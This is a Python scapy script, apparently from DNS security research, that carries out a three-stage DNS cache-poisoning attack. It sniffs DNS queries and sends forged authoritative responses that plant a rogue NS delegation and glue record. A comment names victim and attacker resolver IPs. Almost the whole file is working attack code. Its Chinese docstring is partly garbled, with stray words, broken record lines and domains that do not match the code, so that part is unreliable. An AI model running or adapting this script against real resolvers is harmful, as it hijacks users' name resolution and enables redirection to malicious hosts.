#coding=utf-8
from scapy.all import *
import re

'''
主要功能：
监听流量，依据报文中的IP地址判断
1、植入阶段
1.1、接收目标解析器发来的植入阶段的报文
1.2、向目标解析器回应

2、注入阶段
2.1、向目标解析器发送注入阶段的载荷
2.2、分析注入阶段接收到的应答报文，若查询域名的IP地址为1.2.3.5，则说明注入成功。

3、验证阶段
3.1、向目标解析器发送验证阶段的载荷
3.2、分析验证阶段接收到的应答报文，若查询域名的IP地址为1.2.3.6，则说明注入成功。

数据结构：
1、植入阶段发出
;;Query      
one.test-u3-4.cased.de  A ?

植入阶段收到
;;Query      
one.test-u3-4.cased.de  A   ?
;;Answer     
one.test-u3-4.cased.de  A   1.2.3.4
;;Authority  
one.test-u3-4.cased.de  NS  ns.test-u3-4.cased.de
;;Additional 
ns.test-u3-4.cased.de   A   141.12.174.20

2、注入阶段发出.de       A   141.12.174.21

;;Query      two.sub.test-u3-4.cased.de A ?

植入阶段收到
;;Query      
two.sub.test-u3-4.cased.de  A   ?
;;Answer     
two.sub.test-u3-4.cased.de  A   1.2.3.5
;;Authority  
two.sub.test-u3-4.cased.de  NS  ns.test-u3-4.cased.de
;;Additional 
ns.test-u3-4.cased.de       A   141.12.174.21你们的键盘

3、验证阶段发出
;;Query      three.test-u3-4.cased.de A ?

植入阶段收到
;;Query      
three.test-u3-4.cased.de  A   ?
;;Answer     
three.test-u3-4.cased.de  A   1.2.3.6
;;Authority  
three.test-u3-4.cased.de  NS  ns.test-u3-4.cased.de
;;Additional 
ns.test-u3-4.cased        A   141.12.174.21

'''

def makeSeedPacket (inputPacket,ip,dns):
    
    if(re.search("172\.16\.0\.11",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.1.1"))
    


def makePoisonPacket (inputPacket,ip,dns):#  Victim DNS = 23.105.208.62  ;  Attacker DNS = 134.175.49.111
   
    if(re.search("172\.16\.0\.10",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qdcount=1,nscount=1,arcount=1,qd=dns.qd,ns=DNSRR(rrname='sub.test3.ownhp.cn',type = "NS",ttl=3600,rdata="ns3.test3.ownhp.cn"),ar=DNSRR(rrname='ns3.test3.ownhp.cn',type = "A",ttl=3600,rdata="39.108.238.75"))#134.175.49.111,type="A"
    
    if(re.search("172\.1\.18\.163",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qdcount=1,ancount=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.2"))
  
   

def makeValidatePacket (inputPacket,ip,dns):
    
    if(re.search("172\.16\.0\.10",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.4"))
         
    if(re.search("172\.1\.18\.163",ip.dst)):
        return IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=53)/DNS(id=dns.id,qr=1,aa=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname,ttl=3600,rdata="0.0.5.3"))
                                                                                                                                                                                    
    

while 1:
    wakeUpPacket=sniff(filter="port 53 ",count=1)

    if not wakeUpPacket[0].haslayer(DNS) or wakeUpPacket[0].qr : 
        continue                                                                                                                                                                                                                                                                    

    ip=wakeUpPacket[0].getlayer(IP)
    dns=wakeUpPacket[0].getlayer(DNS)
	
    if(wakeUpPacket[0].qr==0 and re.search(" one[a-zA-Z0-9]*\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname) ):
        one=makeSeedPacket(wakeUpPacket[0],ip,dns)
        if(one):
            send(one)
            print "\n  note1: the response packet to plant DNS cache is sent. \n"
        continue
    if(wakeUpPacket[0].qr==0 and re.search("two[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname)):
        two=makePoisonPacket(wakeUpPacket[0],ip,dns)
        if(two):
            send(two)
            print "\n  note2: the response packet to poison DNS cache is sent.\n"
        continue
    if(wakeUpPacket[0].qr==0 and re.search("three[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.ownhp\.cn",wakeUpPacket[0].qd.qname)):
        three=makeValidatePacket(wakeUpPacket[0],ip,dns)
        if(three):
            send(three)
            print "\n  note3: the response packet to check the result of poisoning is sent.\n"
            print "\n  note: continue listening ..\n"
        continue
    continue
      
    
